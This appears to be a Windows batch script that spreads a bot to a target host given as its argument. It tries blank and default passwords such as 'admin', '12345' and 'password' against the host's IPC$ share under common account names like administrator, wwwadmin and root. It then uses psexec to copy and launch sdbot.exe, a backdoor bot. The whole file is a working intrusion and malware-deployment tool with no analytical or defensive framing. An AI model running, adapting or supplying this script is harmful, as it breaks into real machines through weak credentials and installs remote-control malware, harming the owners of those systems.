@echo off
net use \\%1\ipc$ "" /user:administrator
net use \\%1\ipc$ "" /user:administrateur
net use \\%1\ipc$ "" /user:wwwadmin
net use \\%1\ipc$ "" /user:database
net use \\%1\ipc$ "" /user:user
net use \\%1\ipc$ "admin" /user:wwwadmin
net use \\%1\ipc$ "wwwadmin" /user:wwwadmin
net use \\%1\ipc$ "database" /user:database
net use \\%1\ipc$ "admin" /user:database
net use \\%1\ipc$ "user" /user:user
net use \\%1\ipc$ "admin" /user:user
net use \\%1\ipc$ "admin" /user:Administrator
net use \\%1\ipc$ "admin" /user:administrator
net use \\%1\ipc$ "password" /user:administrator
net use \\%1\ipc$ "12345" /user:Administrator
net use \\%1\ipc$ "administrator" /user:administrator
net use \\%1\ipc$ "root" /user:root
net use \\%1\ipc$ "admin" /user:admin
net use \\%1\ipc$ "1" /user:administrator
net use \\%1\ipc$ "12" /user:administrator
net use \\%1\ipc$ "123" /user:administrator
net use \\%1\ipc$ "1234" /user:administrator
net use \\%1\ipc$ "123456" /user:administrator
psexec \\%1 attrib.exe -r sdbot.exe
psexec \\%1 -f -c -d sdbot.exe -o
psexec \\%1 -d sdbot.exe -o